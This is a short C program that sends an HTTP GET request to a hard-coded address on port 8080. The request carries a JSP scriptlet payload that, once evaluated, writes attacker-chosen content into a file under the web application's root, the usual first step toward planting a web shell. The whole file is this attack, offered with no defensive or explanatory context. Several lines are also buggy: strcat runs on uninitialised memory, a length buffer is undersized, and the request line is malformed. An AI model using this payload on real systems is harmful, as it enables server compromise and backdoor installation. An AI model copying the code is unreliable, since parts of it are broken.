#include <stdio.h>
#include <string.h>
#include <strings.h>
#include <stdlib.h>
#include "libsock.h"
int main(int argc,char **argv)
{
	printf("started!\n");
	struct server_info serv;
	bzero(&serv, sizeof(serv));
	serv.ip_addr = "192.168.1.4";
	serv.port = 8080;
	printf("init struct!!\n");
	int sockfd = 0;
	char *header = NULL;
	char *results = (char *)malloc(4089);
	sockfd = connection(&serv);
	printf("connect...%d\t",sockfd);

	char *str = "a=<%if(request.getParameter(\"f\")!=null)(new/**/java.io.FileOutputStream(application.getRealPath(\"/\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes());%><a%20href=\"One_OK\"";
	char *len = (char *)malloc(sizeof(long int));
	sprintf(len,"%ld",strlen(str));
	header = (char *)malloc(4089);
	strcat(header, "GET /test?");
	strcat(header, str); 
	strcat(header, "HTTP/1.1\n");
  	strcat(header, "Host: *\n");
  	strcat(header, "Content-Type: application/x-www-form-urlencoded\n");
  	strcat(header, "Content-Length: ");
  	strcat(header, len);
  	strcat(header, "\n\n");
	strcat(header, "");
  	strcat(header, "\r\n\r\n");
	printf("request.....\n");	
	request(sockfd,header,results);
	free(len);
	free(results);
	len = NULL;
	results = NULL;
	return 0;	
}
